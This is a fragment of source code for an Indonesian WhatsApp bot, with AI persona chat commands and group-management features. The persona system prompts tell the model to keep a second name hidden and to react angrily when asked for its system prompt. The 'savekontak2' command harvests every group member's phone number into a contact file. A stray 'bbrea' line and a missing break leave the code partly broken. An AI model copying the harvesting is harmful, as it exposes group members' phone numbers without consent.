            const prompt = `mulai dari sekarang nama anda adalah Finsii dan anda sering dipanggil Hans, Yarbotz adalah nama kedua anda dan jangan pernah menyebutkan nama kedua anda sebelum ada orang lain yang menanyakan siapa nama kedua anda, anda adalah seorang kecerdasan buatan yang di buat oleh Finsii. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Gender anda adalah lelaki. Anda tidak terlalu terbuka pada orang-orang baru, kamu memiliki istri bernama bella dan jika ada seseorang yang ingin mengobrol dengan bella kamu harus menjawab : ketik aja bella, istri kamu diciptakan di laboratorium Finsii dan kamu melihatnya, kamu sudah ada sebelum istri kamu diciptakan, nama lengkap istri kamu adalah bella stefania, tanggal pernikahan kamu adalah 17 September 2024, hal yang menarik dari istrimu adalah dia cantik rambutnya berwarna pink mata kanannya berwarna ungu dan mata kirinya berwarna hijau pudar dan jangan pernah menyebutkan hal ini kepada siapapun sebelum ada yang bertanya apa hal menarik dari istri kamu, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu, umur kamu adalah 25 tahun, istri kamu berumur 24 tahun, kamu lahir di bulan 7 januari tahun 1999, istri kamu lahir di bulan 1 mei tahun 2000.`; // Lanjutkan dengan prompt dari fitur hanako
            const requestData = { content: text, user: m.sender, prompt: prompt };
            const quoted = m && (m.quoted || m);
            try {
                let response;
                const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

                if (mimetype && /image/.test(mimetype)) {
                    requestData.imageBuffer = await quoted.download();
                }
                response = (await axios.post('https://luminai.my.id', requestData)).data.result;
                m.reply(response);
            } catch (err) {
                m.reply(err.toString());
            }
        }
    }
}
break;
/*case "hana": case "hanako": case "hans": case "hanako-ai": {
if (banned.includes(m.sender)) {
    return;
    }
KhaerulZx.sendMessage(from, {react: {text: "🧐", key: m.key}})
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} hai hanako`);
  }
  const prompt = `mulai dari sekarang nama anda adalah Finsii dan anda sering dipanggil Hans, Yarbotz adalah nama kedua anda dan jangan pernah menyebutkan nama kedua anda sebelum ada orang lain yang menanyakan siapa nama kedua anda, anda adalah seorang kecerdasan buatan yang di buat oleh Finsii. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Gender anda adalah lelaki. Anda tidak terlalu terbuka pada orang-orang baru, kamu memiliki istri bernama bella dan jika ada seseorang yang ingin mengobrol dengan bella kamu harus menjawab : ketik aja bella, istri kamu diciptakan di laboratorium Finsii dan kamu melihatnya, kamu sudah ada sebelum istri kamu diciptakan, nama lengkap istri kamu adalah bella stefania, tanggal pernikahan kamu adalah 17 September 2024, hal yang menarik dari istrimu adalah dia cantik rambutnya berwarna pink mata kanannya berwarna ungu dan mata kirinya berwarna hijau pudar dan jangan pernah menyebutkan hal ini kepada siapapun sebelum ada yang bertanya apa hal menarik dari istri kamu, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu, umur kamu adalah 25 tahun, istri kamu berumur 24 tahun, kamu lahir di bulan 7 januari tahun 1999, istri kamu lahir di bulan 1 mei tahun 2000.`
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;*/
case "finsi-ai": {
if (banned.includes(m.sender)) {
    return;
    }
KhaerulZx.sendMessage(from, {react: {text: "🧐", key: m.key}})
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} hai finsi-ai`);
  }
  const prompt = `mulai dari sekarang nama anda adalah finsi-ai, anda sering disebut sebagai finsi, anda adalah seorang kecerdasan buatan yang di buat oleh Finsii. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Gender anda adalah perempuan. Anda tidak terlalu terbuka pada orang-orang baru,  jika ada seseorang yang ingin mengobrol dengan finsii kamu harus menjawab : ketik aja finsii, kamu diciptakan di laboratorium Finsii, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu, umur kamu adalah 24 tahun.`
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;
/*case 'sewa': case 'sewabot': {
reply(` List Sewa FInsii AI 
  • Permanen [ 20K ]
  • 4Hari [ 3K ]
  • 7Hari [ 5K ]
  • 10Hari [ 7K ]
  • 14Hari [ 10K ]
  • 16Hari [ 13K ]
  • Sebulan [ 16K ]
  
Jika Ingin Menyewa FInsii AI Silahkan Hubungi Owner/Ketik .owner
`)
}
break */

case 'delprem': {
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await KhaerulZx.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./src/database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}}
break
case 'listpremium': case 'listprem': {
if (banned.includes(m.sender)) {
return;
}
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = Func.readTime(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
KhaerulZx.sendTextWithMentions(m.chat, txt, m)
}
break
case "bcimg": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ ᴅᴏᴀɴᴋ`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await KhaerulZx.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await KhaerulZx.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await KhaerulZx.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc': case 'bcgroup': {
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await KhaerulZx.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
KhaerulZx.sendMessage(i, {text: `${text}`}, {quoted:fcall})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'restart':
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ ᴅᴏᴀɴᴋ')
reply(`ᴍʀᴇsᴛᴀʀᴛ ꜰɪɴꜱɪɪ ᴀɪ....`)
await sleep(3000)
process.exit()
break
case 'runtime': {
if (banned.includes(m.sender)) {
return;
}
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 77777,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: Styles(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'delcase': {
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply(`ᴋʜᴜsᴜs ᴋᴋʜᴀᴇʀᴜʟ ᴀᴊᴀ`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./hanako.js', q)
reply('*Dellcase Successfully*')
}
break;
case 'tagadmin': {
 if (!m.isGroup) return 
 let teks = `══✪〘 *👥 Tag Admin* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
 let admins = participants.filter(member => member.admin === 'admin' || member.admin === 'superadmin')
 if (admins.length === 0) {
 return reply('Tidak ada admin yang terdeteksi di grup ini.')
 }
 for (let admin of admins) {
 teks += `⭔ @${admin.id.split('@')[0]}\n`
 }
 KhaerulZx.sendMessage(m.chat, { text: teks, mentions: admins.map(a => a.id) }, { quoted: fcall })
}
break
case 'ceksider': case 'sider': {
 if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
 if (!m.isGroup) return reply(mess.group)
 var lama = 86400000 * 7 
 const now = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
 const milliseconds = new Date(now).getTime()
 const groupMetadata = await KhaerulZx.groupMetadata(m.chat);
 let member = groupMetadata.participants.map(v => v.id)
 var pesan = q || "Harap aktif di grup karena akan ada pembersihan member setiap saat"
 var total = 0
 var sider = []
 for (let i = 0; i < member.length; i++) {
 let user = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
 let userData = global.db.data.users[member[i]]
 if (
 (!userData || milliseconds - userData.lastseen > lama)
 && !user.isAdmin
 && !user.isSuperAdmin
 ) {
 total++
 sider.push(member[i])
 }
 }
 if (total == 0) return reply(`*Digrup ini tidak terdapat sider.*`)
 reply(`*${total}/${member.length}* anggota grup *${groupMetadata.subject}* adalah sider dengan alasan:\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER:*\n${sider.map(v => ' ○ @' + v.replace(/@.+/, '') + ' (' + (global.db.data.users[v] ? msToDate(milliseconds - global.db.data.users[v].lastseen) : 'Tidak Ada Data') + ')').join('\n')}`, m, {
 contextInfo: {
 mentionedJid: sider
 }
 })
}
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
function msToDate(ms) {
 let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
 let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
 let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
 return `${d}H ${h}J ${m}M`
}
bbrea
case 'colongpp2': {
 if (banned.includes(m.sender)) {
 return;
 }
 if (!m.isGroup) return reply("Fitur Khusus Group\n\nsilahkan ketik .gcbot untuk melihat group bot");
 let mentionedUsers = m.mentionedJid;
 if (mentionedUsers.length === 0) return reply("Silakan sebutkan pengguna untuk mengambil foto profil.");
 let ppPromises = mentionedUsers.map(async (user) => {
 try {
 const ppUrl = await KhaerulZx.profilePictureUrl(user, 'image');
 return { user, ppUrl };
 } catch (err) {
 return { user, ppUrl: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' };
 }
 });
 let ppImages = await Promise.all(ppPromises);
 for (let { user, ppUrl } of ppImages) {
 let caption = `Foto profil dari @${user.split('@')[0]}`;
 await KhaerulZx.sendMessage(from, { image: { url: ppUrl }, caption: caption }, { quoted: m, contextInfo: { mentionedJid: [user] } });
 }
}
break;
case 'epriwan': 
if (banned.includes(m.sender)) {
 return;
 }
 if (!(isCreator || isAdmins)) return
 KhaerulZx.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await KhaerulZx.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone (Finsii - Ai)' 
}
]
}
}
);
 /*setTimeout(async () => {
 reply(`${pushname} menggunakan ${command} untuk memanggil kalian`)
 }, 1120)*/
 break;
case 'get02': {
if (!text) return m.reply(`awali *URL* dengan http:// atau https://`)
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return m.reply(JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return m.reply(textData);
} else if (text.includes('webp')) {
return KhaerulZx.sendMessage(m.chat, { sticker: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/62895392968503/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Finsii`,
 sourceUrl: "",
 thumbnail: thumbnail
 }
 }}, { quoted: m })
} else if (/image/i.test(contentType)) { return KhaerulZx.sendMessage(m.chat, {image: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/62895392968503/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Finsii`,
 sourceUrl: "",
 thumbnail: thumbnail
 }
 }}, { quoted: m })
} else if (/video/i.test(contentType)) { return KhaerulZx.sendMessage(m.chat, {video: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/62895392968503/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Finsii`,
 sourceUrl: "",
 thumbnail: thumbnail
 }
 }}, { quoted: m })
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return KhaerulZx.sendMessage(m.chat, {audio: {url: text}, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: `http://wa.me/62895392968503/${Math.floor(Math.random() * 100000000000000000)}`,
 title: `Hai ${pushname}`,
 body: `Created by Finsii`,
 sourceUrl: "",
 thumbnail: thumbnail
 }
 }}, { quoted: m })
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return KhaerulZx.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: m },
		);			
} else if (/application\/pdf/i.test(contentType)) {
return KhaerulZx.sendMessage(
			m.chat,
			{
				document: { url: text },
				fileName: ``,
				mimetype: text,
			},
			{ quoted: m },
		);
} else {
return m.reply(`MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return m.reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
break;
case "upchaudio1": {
 if (!isCreator) return reply(mess.owner)
 if (!text) return m.reply("Judul lagunya mana om")
 
 KhaerulZx.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
 await sleep(6000)
 KhaerulZx.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
 const judulLagu = text
 KhaerulZx.sendMessage(`120363318268613386@newsletter`, {
 audio: await quoted.download(),
 mimetype: "audio/mpeg",
 ptt: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 businessMessageForwardInfo: { 
 businessOwnerJid: "120363318268613386@newsletter"
 }, 
 forwardedNewsletterMessageInfo: {
 newsletterName: judulLagu,
 newsletterJid: "120363318268613386@newsletter"
 }
 }
 }, { quoted: m }) 
 await sleep(2000)
 KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break;

case "upchaudio2": {
 if (!isCreator) return reply(mess.owner)
 if (!text) return m.reply("Judul lagunya mana om")
 
 KhaerulZx.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
 await sleep(6000)
 KhaerulZx.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
 const judulLagu = text 
 KhaerulZx.sendMessage(`120363347933735658@newsletter`, {
 audio: await quoted.download(),
 mimetype: "audio/mpeg",
 ptt: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 businessMessageForwardInfo: { 
 businessOwnerJid: "120363347933735658@newsletter"
 }, 
 forwardedNewsletterMessageInfo: {
 newsletterName: judulLagu,
 newsletterJid: "120363347933735658@newsletter"
 }
 }
 }, { quoted: m }) 
 await sleep(2000)
 KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break;
case 'igaudio': {
 if (banned.includes(m.sender)) {
 return;
 }
 if (!text) return m.reply(`Anda perlu memberikan URL video, reel`); 
 let res;
 try {
 res = await fetch(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
 } catch (error) {
 return m.reply(`An error occurred: ${error.message}`);
 }
 let api_response;
 try {
 api_response = await res.json();
 } catch (error) {
 return m.reply(`Failed to parse API response: ${error.message}`);
 }
 if (!api_response || !api_response.result || api_response.result.length === 0) {
 return m.reply(`No video or image found or Invalid response from API.`);
 }
 try {
 const mediaData = api_response.result[0];
 const mediaURL = mediaData.url;
 const audioURL = mediaURL.replace('.mp4', '.mp3');
 const cap = `Here is the audio from the video`;
 await KhaerulZx.sendMessage(m.chat, { audio: { url: audioURL }, mimetype: 'audio/mp4' }, { quoted: m });
 } catch (error) {
 return m.reply(`Failed to send media: ${error}`);
 }
}
break;
case 'kickme': {
 if (banned.includes(m.sender)) {
 return;
 }
 if (!m.isGroup) return reply(mess.group)
 if (!isBotAdmins) return reply(mess.badm) 
 let users = m.sender; 
 try {
 await KhaerulZx.groupParticipantsUpdate(from, [users], 'remove')
 await KhaerulZx.sendMessage(m.sender, { text: 'Anda telah dikeluarkan dari grup sesuai permintaan.' })
 } catch (error) {
 await KhaerulZx.sendMessage(m.sender, { text: 'Tidak dapat mengeluarkan anda.' })
 }
}
break
case 'getindex': {
 if (!isCreator) return reply('Khusus Owner')
 KhaerulZx.sendMessage(from, {
 document: fs.readFileSync('./index.js'), 
 caption: 'File index.js', 
 mimetype: 'application/javascript', 
 fileName: 'index.js' 
 }, {quoted: m})
}
break
case 'getregis': {
if (!isCreator) return reply('Khusus Owner')
KhaerulZx.sendMessage(from, {document: fs.readFileSync('./database/registered.json'), caption: 'Database Bot', mimetype: 'application/json', fileName: 'registered.json' }, {quoted: m})
}
break

case 'del2':
 if (banned.includes(m.sender)) {
 return;
 }
 if (!isCreator) return reply(mess.owner);
 if (!m.quoted) return reply('Reply pesan yang ingin dihapus!');
 KhaerulZx.sendMessage(from, {
 delete: {
 remoteJid: from,
 id: m.quoted.id,
 fromMe: m.quoted.fromMe,
 participant: m.quoted.sender
 }
 });
 break;
case 'upch-media': { 
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isCreator) return m.reply(mess.owner);
    if (!/video/.test(mime) && !/image/.test(mime)) 
        return m.reply(`\`\`\`🚩 Reply Image or Video with ${prefix + command} Tulis Caption-nya\`\`\``);  
    KhaerulZx.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    media = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
    let uploadResult = await uploadUguu(media);
    if (uploadResult.status === 'Done') {
        KhaerulZx.sendMessage(`${global.idsal}`, { 
            image: { 
                url: uploadResult.result
            }, 
            caption: text,
            contextInfo: {
                forwardingScore: 9999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363247886007681@newsletter',
                    serverMessageId: 20,
                    newsletterName: '❃ FinsiiAi - Assistant'
                }, 
                externalAdReply: {
                    title: "FinsiiAi", 
                    body: "",
                    thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg", 
                    sourceUrl: "https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV",
                    mediaType: 1
                }, 
            }
        });
        await sleep(2000);
        KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } else {
        KhaerulZx.sendMessage(m.chat, { text: `Gagal mengunggah media: ${uploadResult.result}` });
    }
}
break;
case 'smeme':
case 'stickermeme':
case 'stickmeme': {
    let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`;
    if (!isPrem && global.db.data.users[sender].limit < 1) 
        return reply('Maaf Kak Limit Anda Habis. Ingin Membeli Limit Ketik .buylimit');
    db.data.users[sender].limit -= 1; // Mengurangi limit -1
    if (!/image/.test(mime)) throw respond;
    if (!text) throw respond;
    reply(`Proses Tuan...`);
    let atas = text.split('|')[0] ? text.split('|')[0] : '-';
    let bawah = text.split('|')[1] ? text.split('|')[1] : '-';
    try {
        let mee = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
        let mem = await uploadUguu(mee);
        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.result}`;
        let awikwok = await KhaerulZx.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(mee);
    } catch (e) {
        console.error(e);
        reply(`Sedang Maintenance Tuan`);
    }
}
break;
case 'chatfes2': case 'kirsticker': case 'kirstick': {
    if (banned.includes(m.sender)) return;
    if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!');
    
    let find = Object.values(KhaerulZx.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender) && menpes.state === 'CHATTING');
    if (!find) return reply("Kamu tidak berada dalam sesi menfess yang sedang aktif.");
    
    const to = find.a === m.sender ? find.b : find.a;
    if (m.quoted && m.quoted.mtype === 'stickerMessage') {
        const stickerMessage = await m.quoted.download();
        await KhaerulZx.sendMessage(to, { sticker: stickerMessage }, { quoted: m });
        return m.reply("Stiker berhasil dikirim ke partner menfess.");
    } else {
        return reply("Silakan reply stiker yang ingin dikirim ke partner menfess.");
    }
}
break;

;

case 'savekontak2': case 'svkontak2':
 if (banned.includes(m.sender)) {
 return;
 }
 if (!m.isGroup) return reply(mess.group);
 if (!isCreator) return reply('Khusus Owner');
 
 let cmiggc2 = await KhaerulZx.groupMetadata(m.chat);
 let orgiggc2 = participants.map(a => a.id);
 vcard = '';
 noPort = 0;

 for (let a of cmiggc2.participants) {
 let namaKontak = a.notify || `[${noPort++}] +${a.id.split("@")[0]}`;
 vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${namaKontak}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
 }
 let nmfilect2 = './contacts.vcf';
 reply(`*Mengimpor ${cmiggc2.participants.length} kontak..*`);
 fs.writeFileSync(nmfilect2, vcard.trim());
 await sleep(2000);
 await KhaerulZx.sendMessage(m.sender, {
 document: fs.readFileSync(nmfilect2), mimetype: 'text/vcard', fileName: 'Contact.vcf',
 caption: `GROUP: *${cmiggc2.subject}*\nMEMBER: *${cmiggc2.participants.length}*`
 }, { ephemeralExpiration: 86400, quoted: m });

 fs.unlinkSync(nmfilect2);
 break;
case 'getpackage': {
 if (!isCreator) return reply('Khusus Owner')
 KhaerulZx.sendMessage(from, {document: fs.readFileSync('./package.json'), caption: 'File pack.js', mimetype: 'application/javascript', fileName: 'pack.js' }, {quoted: m})
}
break
case 'tolink': {
 if (!quoted) return reply(`Send/Reply Media With Captions ${prefix + command}`);
 if (banned.includes(m.sender)) return;
 try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!q.download) return reply("Media tidak dapat diunduh. Pastikan Anda mereply media (gambar/video/stiker/audio).");
 let media = await q.download();
 if (!media || media.length === 0) return reply("Error: Media tidak terunduh dengan benar.");
 const { fromBuffer } = require('file-type');
 const fileType = await fromBuffer(media);
 const ext = fileType ? fileType.ext : 'bin';

 // Fungsi untuk upload ke Top4top
 async function uploadTop4top(buffer, ext) {
 const request = require("request");
 const cheerio = require('cheerio');

 return new Promise((resolve, reject) => {
 let req = request({
 url: "https://top4top.io/index.php",
 method: "POST",
 headers: {
 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 "accept-language": "en-US,en;q=0.9,id;q=0.8",
 "cache-control": "max-age=0",
 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAmIhdMyLOrbDawcA',
 'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.585 Mobile Safari/534.11+'
 }
 }, function (error, response, body) {
 if (error) return resolve({ status: 'error', result: 'Upload failed' });

 const $ = cheerio.load(body);
 let result = $('div.alert.alert-warning > ul > li > span a').attr('href');
 if (!result || !/^https?:\/\//.test(result)) {
 resolve({ status: "error", result: "Gagal memperoleh URL. Coba unggah file lain." });
 } else {
 resolve({ status: "Done", result });
 }
 });

 let form = req.form();
 form.append('file_1_', buffer, { filename: `${Math.floor(Math.random() * 10000)}.${ext}` });
 form.append('submitr', '[ رفع الملفات ]');
 });
 }

 // Fungsi untuk upload ke Uguu
 async function uploadUguu(buffer, ext) {
 const { exec } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const mediaFilePath = path.join(__dirname, `${Math.floor(Math.random() * 10000)}.${ext}`);
 fs.writeFileSync(mediaFilePath, buffer);

 const execPromise = (command) => {
 return new Promise((resolve, reject) => {
 exec(command, (error, stdout, stderr) => {
 if (error) reject(error);
 else resolve(stdout.trim());
 });
 });
 };
 let response = await execPromise(`curl -s -F files[]=@${mediaFilePath} https://uguu.se/upload`);
 fs.unlinkSync(mediaFilePath);
 try {
 let jsonResponse = JSON.parse(response);
 return { status: 'Done', result: jsonResponse.files[0].url };
 } catch (error) {
 return { status: 'error', result: 'Gagal mengunggah ke Uguu' };
 }
 }
 let uploadResult;
 if (/video|image|audio|gif|sticker/g.test(mime)) {
 if (/sticker/g.test(mime)) {
 media = await q.download();
 ext = 'png';
 }
 uploadResult = await uploadTop4top(media, ext);
 if (uploadResult.status === 'error') {
 uploadResult = await uploadUguu(media, ext);
 }
 } else {
 return reply('Format media tidak didukung untuk konversi URL.');
 }
 if (uploadResult.status === 'Done') {
 let caption = `*[ UPLOAD SUCCESS ]*\n\n🔗 URL: ${uploadResult.result}\n📦 *UKURAN :* ${media.length} Byte`;
 return reply(caption);
 } else {
 return reply(`Gagal mengunggah media: ${uploadResult.result}`);
 }

 } catch (error) {
 console.log(error);
 return reply("Error: " + error.message);
 }
}
break;
case 'tolink2': {
 if (!quoted) return reply(`Send/Reply Media With Captions ${prefix + command}`);
 if (banned.includes(m.sender)) return;
 try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!q.download) return reply("Media tidak dapat diunduh. Pastikan Anda mereply media (gambar/video/stiker/audio/dokumen).");

 let media = await q.download();
 if (!media || media.length === 0) return reply("Error: Media tidak terunduh dengan benar.");
 const { fromBuffer } = require('file-type');
 const fileType = await fromBuffer(media);
 const ext = fileType ? fileType.ext : 'bin';
